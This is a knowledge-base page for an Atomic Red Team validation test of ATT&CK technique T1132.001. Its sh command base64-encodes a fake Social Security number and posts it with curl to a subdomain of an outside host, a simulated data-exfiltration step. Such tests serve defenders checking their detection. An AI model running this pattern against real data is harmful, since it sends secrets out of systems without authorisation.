---
atomic_guid: "1164f70f-9a88-4dff-b9ff-dc70e7bf0c25"
title: "Base64 Encoded data."
framework: "atomic"
generated: "true"
attack_technique_id: "T1132.001"
attack_technique_name: "Data Encoding: Standard Encoding"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1132.001/T1132.001.yaml"
build_date: "2026-04-26 14:38:40"
executor: "sh"
aliases:
  - "1164f70f-9a88-4dff-b9ff-dc70e7bf0c25"
  - "Base64 Encoded data."
platforms:
  - "macos"
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Base64 Encoded data.

Utilizing a common technique for posting base64 encoded data.

## Metadata

- Atomic GUID: 1164f70f-9a88-4dff-b9ff-dc70e7bf0c25
- Technique: T1132.001: Data Encoding: Standard Encoding
- Platforms: macos, linux
- Executor: sh
- Source Path: atomics/T1132.001/T1132.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1132-data_encoding|T1132.001]]

## Input Arguments

### base64_data

- description: Encoded data to post using fake Social Security number 111-11-1111.
- type: string
- default: MTExLTExLTExMTE=

### destination_url

- description: Destination URL to post encoded data.
- type: url
- default: redcanary.com

## Executor

- name: sh

### Command

```sh
echo -n 111-11-1111 | base64
curl -XPOST #{base64_data}.#{destination_url}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1132.001/T1132.001.yaml)
